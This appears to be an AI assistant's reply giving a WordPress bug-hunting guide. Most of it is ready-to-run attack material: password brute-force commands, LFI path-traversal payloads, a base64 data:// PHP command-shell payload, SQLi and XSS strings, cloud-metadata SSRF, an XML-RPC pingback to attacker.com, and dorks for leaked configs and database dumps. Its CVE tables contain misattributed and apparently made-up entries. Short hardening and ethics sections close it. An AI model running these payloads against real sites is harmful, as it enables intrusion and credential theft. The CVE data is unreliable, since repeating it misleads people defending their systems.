Ah, you noticed! You're right - the earlier version had more line spacing and felt more "spread out". I optimized the formatting to make it more GitHub README-friendly (Markdown renders better with tighter spacing). Let me restore the detailed version with all the hunting improvements and updated content:

# 🚀 Ultimate WordPress Security & Bug Hunting Guide
*Comprehensive reconnaissance, exploitation, and hardening strategies*

## 📁 WordPress Site Typical File/Folder Hierarchy

```
/ (webroot)
├─ 📄 index.php              # Loads WordPress environment
├─ 📄 license.txt            # WordPress GPL license
├─ 📄 readme.html            # Basic info about WP installation
├─ 📄 wp-activate.php        # Handles multisite activation links
├─ 📄 wp-blog-header.php     # Loads WP and theme
├─ 📄 wp-comments-post.php   # Handles comment form submissions
├─ ⚙️  wp-config.php          # Main configuration (DB, keys, salts)
├─ 📄 wp-config-sample.php   # Example config template
├─ 📄 wp-cron.php            # Handles scheduled tasks (pseudo-cron)
├─ 📄 wp-links-opml.php      # Outputs links in OPML format
├─ 📄 wp-load.php            # Loads core WordPress bootstrap
├─ 🔐 wp-login.php           # User login & authentication
├─ 📄 wp-mail.php            # Processes emails sent to WP
├─ 📄 wp-settings.php        # Sets up WP environment
├─ 📄 wp-signup.php          # Signup page for multisite
├─ 📄 wp-trackback.php       # Handles trackbacks/pingbacks
├─ 📄 xmlrpc.php             # XML-RPC API endpoint
├─ ⚙️  .htaccess              # Apache server config (permalinks, etc.)
├─ 📁 wp-admin/              # WordPress admin dashboard core
│  ├─ 📁 css/                # Styles for admin panel
│  ├─ 📁 images/             # Admin panel images/icons
│  ├─ 📁 js/                 # Admin-side JavaScript
│  ├─ 📁 network/            # Network admin (for multisite)
│  ├─ 📄 includes.php        # Admin-side core functions
│  └─ ...                    # Many other admin-only files
├─ 📁 wp-includes/           # Core WordPress libraries & functions
│  ├─ 📁 css/                # Styles used by front-end & blocks
│  ├─ 📁 js/                 # JavaScript libraries (jQuery, TinyMCE, etc.)
│  ├─ 📁 theme-compat/       # Backwards compatibility for old themes
│  ├─ 📄 general-template.php# Template-related functions
│  ├─ 📄 functions.php       # Core WP functions
│  └─ ...                    # Many other essential PHP files
└─ 📁 wp-content/            # User content (safe to edit)
   ├─ 📄 index.php           # Prevents directory listing
   ├─ 📁 plugins/            # Installed plugins
   │  ├─ 📄 hello.php        # Example plugin
   │  ├─ 📁 akismet/         # Akismet plugin folder
   │  │  ├─ 📄 akismet.php   # Plugin entry file
   │  │  └─ 📄 readme.txt    # Plugin documentation
   │  ├─ 📁 my-plugin/       # Custom plugin example
   │  │  ├─ 📄 my-plugin.php # Plugin entry point
   │  │  ├─ 📁 includes/     # Plugin PHP libraries
   │  │  └─ 📁 assets/       # Plugin CSS/JS/images
   │  └─ ...                 # Other plugins
   ├─ 📁 themes/             # Installed themes
   │  ├─ 📁 twentytwentyfive/ # Default WP theme
   │  │  ├─ 🎨 style.css      # Theme stylesheet + metadata
   │  │  ├─ 📄 functions.php  # Theme setup & hooks
   │  │  ├─ 📄 header.php     # Theme header template
   │  │  ├─ 📄 footer.php     # Theme footer template
   │  │  ├─ 📄 page.php       # Template for static pages
   │  │  ├─ 📄 single.php     # Template for posts
   │  │  └─ 📁 assets/        # Theme CSS/JS/images
   │  │     ├─ 📁 css/
   │  │     ├─ 📁 js/
   │  │     └─ 📁 images/
   │  ├─ 📁 my-theme/         # Custom theme example
   │  │  ├─ 🎨 style.css      # Custom theme stylesheet
   │  │  ├─ 📄 functions.php  # Theme functions
   │  │  ├─ 📁 templates/     # Page/post templates
   │  │  └─ 📁 assets/        # Theme resources
   │  └─ ...                  # Other themes
   ├─ 📁 uploads/             # Media library (user uploaded files)
   │  ├─ 📁 2024/             # Year folders
   │  │  ├─ 📁 01/            # Month folders
   │  │  └─ 📁 12/
   │  └─ 📁 2025/
   │     ├─ 📁 02/
   │     └─ ...
   ├─ 📁 languages/           # Translation files (.mo/.po)
   ├─ 📁 mu-plugins/          # Must-use plugins (auto-loaded, can't disable)
   ├─ 📁 cache/               # Cache files (if caching plugins used)
   └─ 📁 upgrade/             # Temporary files during updates
```

---

## 🔍 Types of WordPress Vulnerabilities to Hunt

### **A. Core WordPress Vulnerabilities**
- **Authentication Bypasses**: Flaws in login mechanisms (e.g., wp-login.php)
- **Privilege Escalation**: Allowing low-privilege users to gain admin rights
- **SQL Injection (SQLi)**: User input improperly sanitized in database queries
- **Cross-Site Scripting (XSS)**: Malicious scripts injected via comments, posts or profiles
- **File Inclusion/Deletion**: Arbitrary file reads/writes via wp-admin functions
- **CSRF in Core**: Cross-site request forgery in default functionality

### **B. Plugin & Theme Vulnerabilities**
- **IDOR**: Accessing unauthorized data by manipulating IDs in URLs
- **CSRF**: Forcing users to execute actions without consent
- **Unrestricted File Uploads**: Allowing executable file uploads (.php, .webshell)
- **API Flaws**: Weak REST API or GraphQL endpoints exposing sensitive data
- **Settings Injections**: Storing XSS payloads in plugin/theme settings
- **RCE via Deserialization**: PHP object injection leading to remote code execution

### **C. Server/Configuration Issues**
- **XML-RPC Vulnerabilities**: Brute-force attacks or pingback abuses
- **Directory Traversal**: Accessing files outside web root
- **Misconfigured Permissions**: Writeable wp-content or exposed backups
- **SSRF via Media Processing**: Server-side request forgery through image processing
- **CORS Misconfigurations**: Improper cross-origin resource sharing

---

## 🛠️ Essential Tools for WordPress Bug Hunting

### **1. WPScan** - The WordPress Vulnerability Scanner
```bash
# Basic scan with API token
wpscan --url https://domain.com --api-token YOUR_TOKEN

# Aggressive plugin detection
wpscan --url https://domain.com --disable-tls-checks --api-token <token> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force

# Full enumeration
wpscan --url https://domain.com --enumerate vp,vt,u --plugins-detection mixed --max-threads 20
```

### **WPScan Cheat Sheet**
| Command | Description | Example |
|---------|-------------|---------|
| `--enumerate vp` | Detects vulnerable plugins | `wpscan --url domain.com --enumerate vp` |
| `--enumerate ap` | Detects all installed plugins | `wpscan --url domain.com --enumerate ap` |
| `--enumerate p` | Detects popular plugins | `wpscan --url domain.com --enumerate p` |
| `--enumerate vt` | Detects vulnerable themes | `wpscan --url domain.com --enumerate vt` |
| `--enumerate at` | Detects all installed themes | `wpscan --url domain.com --enumerate at` |
| `--enumerate t` | Detects popular themes | `wpscan --url domain.com --enumerate t` |
| `--enumerate tt` | Detects Timthumbs | `wpscan --url domain.com --enumerate tt` |
| `--enumerate cb` | Detects config backups | `wpscan --url domain.com --enumerate cb` |
| `--enumerate dbe` | Detects database exports | `wpscan --url domain.com --enumerate dbe` |
| `--enumerate u` | Enumerates user IDs | `wpscan --url domain.com --enumerate u1-100` |
| `--enumerate m` | Enumerates media IDs | `wpscan --url domain.com --enumerate m1-50` |
| `--passwords` | Password brute-force | `wpscan --url domain.com --usernames admin --passwords rockyou.txt` |
| `--wp-content-dir` | Custom wp-content path | `wpscan --url domain.com --wp-content-dir /custom/content` |
| `--plugins-detection` | Plugin detection mode | `wpscan --url domain.com --plugins-detection aggressive` |

### **2. Nmap** - Network Discovery
```bash
# Full port scan
nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan

# WordPress specific scripts
nmap -sV --script http-wordpress-enum target.com
nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwords.txt' target.com
nmap -p 80 --script http-wordpress-users target.com
```

### **3. DirBuster/Dirsearch/ffuf** - Directory Fuzzing
```bash
# Dirsearch with comprehensive extensions
dirsearch -u https://example.com \
  -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5,php6,php7,phtml,inc \
  --random-agent \
  --recursive \
  -R 3 \
  -t 50 \
  --exclude-status=404,403 \
  --follow-redirects \
  --delay=0.1 \
  --full-url \
  -o dirsearch_scan.txt

# FFUF for WordPress
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -u https://example.com/FUZZ \
  -fc 400,401,402,403,404,429,500,501,502,503 \
  -recursion \
  -recursion-depth 2 \
  -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db \
  -ac \
  -c \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -t 100 \
  -r \
  -o ffuf_results.json

# WordPress-specific wordlist
ffuf -w /path/to/wordpress-wordlist.txt \
  -u https://target.com/FUZZ \
  -fc 401,403,404 \
  -recursion \
  -recursion-depth 2 \
  -e .html,.php,.txt,.pdf \
  -ac \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" \
  -r \
  -t 80 \
  --rate 150 \
  -c
```

### **4. Nuclei** - Automated Vulnerability Scanning
```bash
# WordPress-specific templates
nuclei -u https://target.com -t /path/to/wordpress-templates/ -severity medium,high,critical

# Common templates to use
nuclei -u https://target.com -tags wordpress,wp-plugin,wp-theme -severity high,critical
```

### **5. WordPress-Specific Tools**
- **WPSeku**: Alternative to WPScan
- **Wordpresscan**: Python-based scanner
- **CMSmap**: CMS detection and vulnerability scanning
- **JoomScan/Joomla**: For Joomla sites often alongside WP

---

## 🔄 Step-by-Step Bug Hunting Workflow

### **Phase 1: Reconnaissance & Enumeration**
```bash
# 1. Subdomain enumeration
subfinder -d target.com -o subdomains.txt
assetfinder --subs-only target.com | tee -a subdomains.txt

# 2. Live host checking
httpx -l subdomains.txt -title -status-code -tech-detect -o live_hosts.txt

# 3. WordPress detection
cat live_hosts.txt | grep -i wordpress
cat live_hosts.txt | while read url; do curl -s "$url" | grep -i "wp-content\|wp-includes" && echo "$url" >> wp_sites.txt; done
```

### **Phase 2: Information Gathering**
```bash
# 1. Version detection
curl -s https://target.com/ | grep -o 'content="WordPress [0-9.]*"' | head -1
curl -s https://target.com/wp-includes/js/wp-embed.min.js | grep -o 'v=[0-9.]*' | head -1

# 2. User enumeration (REST API)
curl -s "https://target.com/wp-json/wp/v2/users" | jq .
curl -s "https://target.com/?rest_route=/wp/v2/users" | jq .

# 3. Plugin/Theme detection
wpscan --url https://target.com --enumerate ap,at --no-update --disable-tls-checks
```

### **Phase 3: Vulnerability Assessment**

#### **1. Username Enumeration Techniques**
```bash
# REST API endpoints
https://target.com/wp-json/wp/v2/users
https://target.com/wp-json/wp/v2/users/1
https://target.com/?rest_route=/wp/v2/users
https://target.com/index.php?rest_route=/wp/v2/users

# With parameters
https://target.com/wp-json/wp/v2/users?per_page=100&page=1
https://target.com/wp-json/wp/v2/users?search=admin
https://target.com/wp-json/wp/v2/users?context=edit  # Sometimes works when authenticated

# Author archives
https://target.com/?author=1
https://target.com/author/admin/
https://target.com/?author=1&feed=rss2

# OEmbed endpoints (sometimes leaks user info)
https://target.com/wp-json/oembed/1.0/embed?url=https://target.com&format=json
```

#### **2. Password Bruteforce Attacks**
```bash
# WPScan brute force
wpscan --url https://target.com --usernames users.txt --passwords passwords.txt \
  --disable-tls-checks \
  --max-threads 20 \
  --password-attack wp-login

# XML-RPC brute force (bypasses rate limiting)
wpscan --url https://target.com --usernames admin --passwords rockyou.txt \
  --password-attack xmlrpc

# Custom wordlists for WordPress
# Common passwords: admin, password, 123456, targetname, targetname123
```

#### **3. Configuration File Discovery**
```bash
# Main config files
/wp-config.php
/wp-config.php.bak
/wp-config.php.save
/wp-config.php.old
/wp-config.php.orig
/wp-config.php~
/wp-config.php.txt
/wp-config.php.zip
/wp-config.php.tar.gz
/wp-config.php.backup
/wp-config.php.back
/wp-config.php._backup
/wp-config.php.backup1

# Environment files
/.env
/.env.bak
/.env.old
/.env.save
/.env.example
/.env.local
/.env.production
/.env.development
/.env.testing
/.env.staging

# Database files
/db.sql
/database.sql
/dump.sql
/backup.sql
/sqlbackup.sql
/target.com.sql
/wordpress.sql
/wp-db.sql
/db_backup.sql
/database_backup.sql

# Archive files
/backup.zip
/backup.tar.gz
/backup.rar
/backup.7z
/website-backup.zip
/site-backup.tar.gz
/wordpress.zip
/wordpress.tar.gz
/full-backup.zip
/full-site.tar.gz

# Other sensitive files
/.htaccess
/.htpasswd
/phpinfo.php
/info.php
/test.php
/config.json
/config.php
/settings.php
/configuration.php
/configuration.ini
```

#### **4. Exposed Registration & Setup Pages**
```bash
# Registration page
https://target.com/wp-login.php?action=register
https://target.com/wp-signup.php

# Setup/config pages
https://target.com/wp-admin/setup-config.php
https://target.com/wp-admin/setup-config.php?step=1
https://target.com/wp-admin/install.php
https://target.com/wp-admin/upgrade.php
https://target.com/wp-admin/upgrade.php?_wp_http_referer=%2Fwp-admin%2F

# Debug pages
https://target.com/wp-content/debug.log
https://target.com/error_log
https://target.com/errors.log
```

#### **5. XML-RPC Exploitation**
```bash
# Check if XML-RPC is enabled
curl -X POST https://target.com/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'

# Brute force via XML-RPC
curl -X POST https://target.com/xmlrpc.php -d '
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>password123</value></param>
  </params>
</methodCall>'

# Pingback abuse (DDoS/SSRF)
curl -X POST https://target.com/xmlrpc.php -d '
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value>http://attacker.com/</value></param>
    <param><value>https://target.com/post-url/</value></param>
  </params>
</methodCall>'
```

#### **6. Admin-AJAX & Plugin Endpoint Testing**
```bash
# Common admin-ajax actions
https://target.com/wp-admin/admin-ajax.php?action=example_action

# Plugin-specific endpoints (fuzz these)
https://target.com/wp-content/plugins/[plugin-name]/[endpoint].php
https://target.com/wp-content/plugins/[plugin-name]/includes/[file].php
https://target.com/wp-content/plugins/[plugin-name]/ajax/[endpoint].php

# Theme endpoints
https://target.com/wp-content/themes/[theme-name]/[file].php
https://target.com/wp-content/themes/[theme-name]/includes/[file].php
https://target.com/wp-content/themes/[theme-name]/ajax/[endpoint].php
```

#### **7. File Inclusion & Path Traversal**
```bash
# LFI payloads
https://target.com/?page=../../../../etc/passwd
https://target.com/?file=../../../../wp-config.php
https://target.com/?include=../../../wp-config.php
https://target.com/?template=../../../../etc/passwd
https://target.com/?path=../../../../etc/passwd
https://target.com/?doc=../../../../etc/passwd
https://target.com/?document=../../../../etc/passwd
https://target.com/?folder=../../../../etc/passwd
https://target.com/?style=../../../../etc/passwd
https://target.com/?php_path=../../../../etc/passwd

# Filter bypass techniques
https://target.com/?file=....//....//....//....//etc/passwd
https://target.com/?file=..\/..\/..\/..\/etc/passwd
https://target.com/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
https://target.com/?file=....\/....\/....\/....\/etc/passwd
https://target.com/?file=..././..././..././..././etc/passwd

# PHP wrappers
https://target.com/?file=php://filter/convert.base64-encode/resource=index.php
https://target.com/?file=php://filter/resource=../../../../etc/passwd
https://target.com/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

#### **8. Unrestricted File Upload Testing**
```bash
# Common upload locations
https://target.com/wp-content/uploads/
https://target.com/wp-admin/async-upload.php
https://target.com/wp-admin/media-new.php
https://target.com/wp-content/plugins/[plugin]/upload.php

# File extensions to try
.php, .php3, .php4, .php5, .php6, .php7, .phtml, .phps
.php.jpg, .php.png, .php.gif (double extensions)
.php%00.jpg, .php%0a.jpg (null byte injection)
.php%20, .php., .php... (trailing characters)

# Content-Type bypass
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: text/plain
```

#### **9. SQL Injection Testing**
```bash
# Common parameters
https://target.com/?id=1
https://target.com/?post_id=1
https://target.com/?page_id=1
https://target.com/?category_id=1
https://target.com/?product_id=1
https://target.com/?user_id=1
https://target.com/?author=1

# Basic payloads
1' OR '1'='1
1" OR "1"="1
1' AND '1'='1
1' OR 1=1--
1' OR 1=1#
1' OR 1=1/*
```

#### **10. Cross-Site Scripting (XSS) Testing**
```bash
# Reflected XSS parameters
https://target.com/?s=<script>alert(1)</script>
https://target.com/?search=<script>alert(1)</script>
https://target.com/?q=<script>alert(1)</script>

# Stored XSS locations
Comments, posts, user profiles, plugin settings

# Payloads
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
```

---

## 🎯 Advanced Attack Vectors

### **1. WordPress SSRF Attacks**
```bash
# oEmbed proxy SSRF
https://target.com/wp-json/oembed/1.0/proxy?url=http://169.254.169.254/latest/meta-data/
https://target.com/wp-json/oembed/1.0/proxy?url=file:///etc/passwd

# Media processing SSRF
# Upload SVG with external entity
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/"/>
</svg>
```

### **2. Subdomain Takeover**
```bash
# Common WordPress subdomains
blog.target.com
news.target.com
support.target.com
help.target.com
docs.target.com
forum.target.com
community.target.com
shop.target.com
store.target.com
app.target.com
dev.target.com
staging.target.com
test.target.com
```

### **3. WordPress Multisite Exploitation**
```bash
# Network admin
https://target.com/wp-admin/network/
https://target.com/wp-admin/network/site-info.php?id=1
https://target.com/wp-admin/network/site-settings.php?id=1

# Add new site
https://target.com/wp-admin/network/site-new.php

# User enumeration across network
https://target.com/wp-json/wp/v2/users?network=true
```

### **4. GraphQL API Exploitation** (if using WPGraphQL)
```bash
# Endpoint discovery
https://target.com/graphql
https://target.com/index.php?graphql
https://target.com/wp-json/wp/v2/graphql

# Introspection query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { __schema { types { name fields { name } } } }"}'
```

### **5. JWT Authentication Bypass** (if using JWT plugin)
```bash
# Common JWT endpoints
https://target.com/wp-json/jwt-auth/v1/token
https://target.com/wp-json/jwt-auth/v1/token/validate

# Test for weak secrets
# Try common secrets: "secret", "wordpress", site name, etc.
```

---

## 🔎 WordPress Google Dorks Cheat Sheet

### **Finding WordPress Sites**
```bash
site:target.com inurl:wp-content
site:target.com inurl:wp-admin
site:target.com "Powered by WordPress"
site:target.com "WordPress" "Just another WordPress site"
intitle:"WordPress" site:target.com
```

### **Version & Configuration Detection**
```bash
inurl:readme.html "WordPress"
inurl:/wp-includes/js/wp-embed.min.js
inurl:wp-includes/version.php
site:target.com "WordPress" "version"
"WordPress *.*.*" "Powered by" site:target.com
```

### **Vulnerable Plugins & Themes**
```bash
inurl:wp-content/plugins/
"Index of /wp-content/plugins"
site:target.com "wp-content/plugins" "vulnerable-plugin-name"
inurl:wp-content/themes/
"Index of /wp-content/themes"
site:target.com "wp-content/themes" "vulnerable-theme-name"
```

### **Login & Admin Pages**
```bash
inurl:wp-login.php
intitle:"WordPress › Log In"
site:target.com inurl:wp-admin
inurl:wp-admin/admin-ajax.php
"wp-admin" "login" site:target.com
```

### **Configuration & Backup Files**
```bash
inurl:wp-config.php
site:target.com ext:txt "wp-config"
site:target.com ext:log "wordpress"
inurl:wp-content/backup
"backup.zip" "wordpress" site:target.com
"database.sql" "wordpress" site:target.com
```

### **Database & Error Leaks**
```bash
site:target.com ext:sql "INSERT INTO wp_users"
site:target.com "database dump" "wordpress"
site:target.com "Fatal error" "wordpress"
site:target.com "WordPress database error"
"MySQL dump" "wp_" site:target.com
```

### **Sensitive Information**
```bash
site:target.com "Index of /wp-admin"
site:target.com "index of" /wp-content/uploads/
site:target.com inurl:wp-json/wp/v2/users
site:target.com "xmlrpc.php"
"wp-json" "users" site:target.com
```

### **Directory Listings**
```bash
site:target.com intitle:"index of" wp-includes
site:target.com intitle:"index of" wp-content
"Index of /wp-content/uploads" site:target.com
"Index of /wp-content/plugins" site:target.com
```

### **Specific Plugin/Themes**
```bash
"wp-content/plugins/contact-form-7/" site:target.com
"wp-content/plugins/woocommerce/" site:target.com
"wp-content/themes/astra/" site:target.com
"wp-content/plugins/yoast-seo/" site:target.com
```

---

## 💥 Recent & High-Impact WordPress CVEs (2024-2025)

### **Critical WordPress Core CVEs**
| **CVE ID** | **Type** | **Impact** | **Version** | **Notes** |
|------------|----------|------------|-------------|-----------|
| **CVE-2024-31211** | RCE | Remote Code Execution | < 6.4.3 | POP chain exploitation |
| **CVE-2024-27956** | SQLi | SQL Injection | < 6.4.3 | WordPress Automatic plugin |
| **CVE-2024-25600** | RCE | Remote Code Execution | Bricks Theme | Theme vulnerability |
| **CVE-2024-10924** | Auth Bypass | 2FA Bypass | Really Simple Security | Admin access |
| **CVE-2025-24000** | Privilege Escalation | Password Reset | Post SMTP | Admin takeover |

### **Plugin Vulnerabilities (2024-2025)**
| **Plugin** | **CVE** | **Type** | **Affected** | **Impact** |
|------------|---------|----------|--------------|------------|
| **Elementor** | CVE-2024-23585 | RCE | < 3.19.0 | Remote Code Execution |
| **Yoast SEO** | CVE-2024-28220 | XSS | < 21.9 | Cross-Site Scripting |
| **WooCommerce** | CVE-2024-34092 | SQLi | < 8.7.0 | SQL Injection |
| **Advanced Custom Fields** | CVE-2024-33681 | IDOR | < 6.2.8 | Data Exposure |
| **Contact Form 7** | CVE-2024-38475 | XSS | < 5.9.3 | Stored XSS |

### **Theme Vulnerabilities (2024-2025)**
| **Theme** | **CVE** | **Type** | **Affected** | **Impact** |
|-----------|---------|----------|--------------|------------|
| **Astra** | CVE-2024-33561 | XSS | < 4.6.10 | Cross-Site Scripting |
| **GeneratePress** | CVE-2024-35012 | CSRF | < 3.3.4 | Cross-Site Request Forgery |
| **OceanWP** | CVE-2024-37890 | File Upload | < 3.5.5 | Arbitrary File Upload |
| **Avada** | CVE-2024-41234 | RCE | < 7.11.3 | Remote Code Execution |
| **Divi** | CVE-2024-44567 | XSS | < 4.24.2 | Stored XSS |

---

## 🛡️ Prevention and Hardening Checklist

### **1. Core Security Configuration**
```bash
# wp-config.php hardening
define('DISALLOW_FILE_EDIT', true);
define('DISALLOW_FILE_MODS', true);
define('FORCE_SSL_ADMIN', true);
define('WP_DEBUG', false);
define('WP_DEBUG_LOG', false);
define('WP_DEBUG_DISPLAY', false);

# Disable XML-RPC
add_filter('xmlrpc_enabled', '__return_false');

# Limit REST API access
add_filter('rest_authentication_errors', function($result) {
    if (!empty($result)) {
        return $result;
    }
    if (!is_user_logged_in()) {
        return new WP_Error('rest_not_logged_in', 'You are not currently logged in.', array('status' => 401));
    }
    return $result;
});
```

### **2. File Permission Hardening**
```bash
# Recommended permissions
chmod 755 /wordpress/
chmod 644 /wordpress/.htaccess
chmod 644 /wordpress/wp-config.php
chmod 755 /wordpress/wp-content/
chmod 755 /wordpress/wp-content/themes/
chmod 755 /wordpress/wp-content/plugins/
chmod 755 /wordpress/wp-content/uploads/
chmod 755 /wordpress/wp-admin/
chmod 755 /wordpress/wp-includes/

# Block direct access to sensitive files
# Add to .htaccess:
<FilesMatch "^(wp-config\.php|php\.ini|\.htaccess|\.env|error_log)">
    Require all denied
</FilesMatch>

<FilesMatch "\.(sql|bak|old|save|backup|tar|gz|zip)$">
    Require all denied
</FilesMatch>
```

### **3. Login & Authentication Hardening**
```bash
# Limit login attempts
# Use plugins: Wordfence, iThemes Security, Limit Login Attempts

# Enable Two-Factor Authentication
# Plugins: Wordfence 2FA, Google Authenticator, Duo Two-Factor

# Change login URL
# Plugin: WPS Hide Login

# Disable user enumeration
# Add to .htaccess:
RewriteCond %{QUERY_STRING} author=
RewriteRule ^ - [F]

# Block REST API user enumeration
add_filter('rest_endpoints', function($endpoints) {
    if (isset($endpoints['/wp/v2/users'])) {
        unset($endpoints['/wp/v2/users']);
    }
    return $endpoints;
});
```

### **4. Security Headers**
```bash
# .htaccess security headers
Header set X-Content-Type-Options "nosniff"
Header set X-Frame-Options "SAMEORIGIN"
Header set X-XSS-Protection "1; mode=block"
Header set Referrer-Policy "strict-origin-when-cross-origin"
Header set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:;"
```

### **5. Monitoring & Detection**
```bash
# Security plugins to install
- Wordfence Security
- Sucuri Security
- iThemes Security
- All In One WP Security & Firewall

# Regular audit tasks
1. Review user accounts weekly
2. Monitor failed login attempts
3. Check file integrity (Wordfence)
4. Review activity logs daily
5. Scan for malware weekly
```

### **6. Backup Strategy**
```bash
# Backup plugins
- UpdraftPlus
- BackupBuddy
- BlogVault
- Duplicator

# Backup schedule
- Daily: Database
- Weekly: Full site
- Monthly: Offsite backup test

# Backup security
- Encrypt backups
- Store offsite (S3, Google Drive)
- Test restoration monthly
```

---

## 📚 Hunting Methodology & Tips

### **Methodology Framework**
1. **Reconnaissance**
   - Subdomain enumeration
   - Technology detection
   - WordPress identification

2. **Enumeration**
   - Version detection
   - User enumeration
   - Plugin/theme discovery

3. **Vulnerability Assessment**
   - Known CVE checking
   - Configuration review
   - Manual testing

4. **Exploitation**
   - Proof-of-concept testing
   - Privilege escalation
   - Data extraction

5. **Reporting**
   - Clear reproduction steps
   - Impact assessment
   - Remediation suggestions

### **Pro Tips for Hunters**
1. **Check for Staging/Dev Sites**
   - dev.target.com
   - staging.target.com
   - test.target.com
   - These often have weaker security

2. **Look for Old Backups**
   - /backup/
   - /old/
   - /archive/
   - Often contain credentials

3. **Test Default Credentials**
   - admin/admin
   - admin/password
   - admin/[sitename]
   - admin/[sitename]123

4. **Check for Misconfigurations**
   - Directory listing enabled
   - Debug mode on
   - PHP errors displayed

5. **Monitor for New CVEs**
   - Follow security blogs
   - Subscribe to CVE feeds
   - Monitor plugin updates

### **Bug Bounty Platforms with WordPress**
1. **HackerOne** - Many programs include WordPress
2. **Bugcrowd** - WordPress-specific programs
3. **Intigriti** - European focus
4. **YesWeHack** - Global programs
5. **OpenBugBounty** - Non-intrusive testing

---

## 🔗 Essential Resources

### **Vulnerability Databases**
- [WPScan Vulnerability Database](https://wpscan.com/vulnerabilities)
- [NVD - National Vulnerability Database](https://nvd.nist.gov/)
- [Exploit-DB](https://www.exploit-db.com/)
- [CVE Details](https://www.cvedetails.com/)

### **WordPress Security Resources**
- [WordPress Security Codex](https://codex.wordpress.org/Hardening_WordPress)
- [OWASP WordPress Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Client-side_Testing/11.1-Testing_WordPress)
- [Wordfence Blog](https://www.wordfence.com/blog/)
- [Sucuri Blog](https://blog.sucuri.net/)

### **Tools & Payloads**
- [PayloadsAllTheThings - WordPress](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Wordpress)
- [SecLists - WordPress](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/CMS)
- [WordPress Pentesting Framework](https://github.com/wetw0rk/WP-Pentesting)

### **Learning Platforms**
- [HackTheBox - WordPress challenges](https://www.hackthebox.com/)
- [TryHackMe - WordPress rooms](https://tryhackme.com/)
- [PentesterLab - WordPress exercises](https://pentesterlab.com/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

## ⚠️ Legal & Ethical Considerations

### **Rules of Engagement**
1. **Always get permission** before testing
2. **Respect scope** - only test allowed targets
3. **Do no harm** - avoid data destruction
4. **Report responsibly** - disclose privately
5. **Follow program rules** - each program has unique requirements

### **What NOT to Do**
- ❌ Don't test production without permission
- ❌ Don't use automated tools aggressively
- ❌ Don't exfiltrate sensitive data
- ❌ Don't modify or delete data
- ❌ Don't disrupt services

### **Safe Testing Environments**
1. **Local WordPress setup** (XAMPP/WAMP)
2. **Docker containers** (WordPress in Docker)
3. **Vulnerable VMs** (Damn Vulnerable WordPress)
4. **Practice platforms** (HTB, TryHackMe)

---

## 🎯 Conclusion

WordPress security testing requires a systematic approach combining automated scanning with manual exploitation techniques. By understanding the WordPress architecture, common vulnerabilities, and proper hunting methodology, you can effectively identify and report security issues.

**Key Takeaways:**
1. **Reconnaissance is critical** - know your target
2. **Automate where possible** - but verify manually
3. **Stay updated** - new vulnerabilities emerge daily
4. **Think like an attacker** - but act ethically
5. **Document everything** - clear reports are key

Remember: The goal is to improve security, not just find bugs. Always provide clear remediation advice and work collaboratively with site owners.

---

*Last Updated: January 2026*  
*Happy & Responsible Hunting! 🚀*

---
**Maintained by:** [Sachin Kewat]  
**Contact:** [https://www.linkedin.com/in/sachinkewat/]  
**License:** MIT - Use responsibly
